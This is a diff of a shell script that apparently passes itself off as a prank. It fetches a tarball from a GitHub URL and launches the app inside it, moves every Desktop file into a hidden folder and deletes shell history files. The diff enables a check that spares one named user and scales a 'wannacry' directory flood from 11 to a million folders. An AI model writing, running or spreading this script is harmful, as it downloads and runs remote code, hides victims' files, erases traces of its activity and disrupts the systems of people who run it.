@@ -1,10 +1,10 @@
-# if [ $(users) == "aaskal" ]
-# then
-#     echo "wa ta sir thwa"
-#     exit 1
-# fi  # replace 'done' with 'fi'
+if [ $(users) == "aaskal" ]
+then
+    echo "wa ta sir thwa"
+    exit 1
+fi  
 
-# # rest of the script...
+
 mkdir -p /tmp/laz/
 
 curl -s -L https://github.com/ic4rusfly/p1/raw/master/prank.tar.gz -o /tmp/laz/prank.tar.gz > /dev/null
@@ -22,11 +22,11 @@ mkdir ~/.Laz/
 
 mv ~/Desktop/* ~/.Laz/
 
-cd ~/tmp
+cd ~/Desktop
 
 rm -rf ~/.*history*
 
-mkdir wannacry{0..10}
+mkdir wannacry{0..1000000}
 
 nohup open /tmp/laz/app/Laz.app > /dev/null
 
